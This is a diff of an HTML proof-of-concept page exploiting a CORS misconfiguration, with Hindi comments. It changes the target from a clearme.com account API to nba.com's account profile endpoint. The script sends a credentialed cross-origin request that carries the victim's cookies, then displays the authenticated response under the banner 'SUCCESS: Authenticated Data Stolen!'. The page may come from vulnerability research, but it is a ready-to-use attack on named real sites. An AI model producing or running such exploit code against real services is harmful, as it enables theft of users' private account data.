@@ -1,22 +1,30 @@
 <!DOCTYPE html>
 <html>
 <body>
-    <h1>CORS Exploit Test</h1>
-    <p>Checking if I can steal data from clearme.com...</p>
-    <div id="data">Waiting for response...</div>
+    <center>
+        <h1>CORS Exploit: Data Exfiltration Proof</h1>
+        <div id="status" style="color: blue;">Attacking core-api.nba.com...</div>
+        <textarea id="result" style="width: 80%; height: 200px; margin-top: 20px;"></textarea>
+    </center>
 
     <script>
-        // उस एंडपॉइंट का URL यहाँ डालें जहाँ सेंसिटिव डेटा हो
-        var targetUrl = "https://verified.clearme.com/api/v1/me"; 
-        
+        // स्टेप 1 में मिला हुआ असली URL यहाँ डालें
+        var targetUrl = "https://www.nba.com/account/nbaprofile"; 
+
         var xhr = new XMLHttpRequest();
         xhr.open("GET", targetUrl, true);
-        xhr.withCredentials = true; // यह सबसे ज़रूरी है क्योंकि सर्वर इसे अलाउ कर रहा है
+        
+        // यह सबसे ज़रूरी हिस्सा है - यह ब्राउज़र को कुकीज़ भेजने के लिए कहता है
+        xhr.withCredentials = true; 
 
         xhr.onreadystatechange = function() {
             if (xhr.readyState == 4) {
-                document.getElementById("data").innerText = xhr.responseText;
-                console.log("Stolen Data: " + xhr.responseText);
+                if (xhr.status == 200) {
+                    document.getElementById("status").innerHTML = "<b style='color:red;'>SUCCESS: Authenticated Data Stolen!</b>";
+                    document.getElementById("result").value = xhr.responseText;
+                } else {
+                    document.getElementById("status").innerText = "Failed to fetch data. Status: " + xhr.status;
+                }
             }
         };
         xhr.send();
